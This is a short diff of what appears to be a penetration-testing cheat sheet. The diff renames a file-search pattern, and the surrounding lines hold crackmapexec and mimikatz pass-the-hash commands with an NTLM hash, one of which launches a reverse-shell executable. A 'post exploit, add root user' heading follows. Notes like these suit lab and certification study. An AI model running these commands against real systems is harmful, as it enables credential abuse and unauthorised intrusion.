@@ -120,8 +120,7 @@ crackmapexec smb 192.168.66.42 -d . -u Administrator -H b4b9b02e6f09a9bd760f388b
 sekurlsa::pth /user:USERNAME /domain:DOMAIN /ntlm:HASH /run:COMMAND
 sekurlsa::pth /user:luke /domain:jedi.local /ntlm:b4b9b02e6f09a9bd760f388b67351e2b /run:c:\Users\Administrator\Desktop\revshell64.exe
 ===Find like on windows
-dir c: /s | findstr /i proof.txt
-dir c: /s | findstr /i local.txt
+dir c: /s | findstr /i toto.txt
 
 ================================================================================ POST EXPLOIT (LINUX)
 ===Add root user
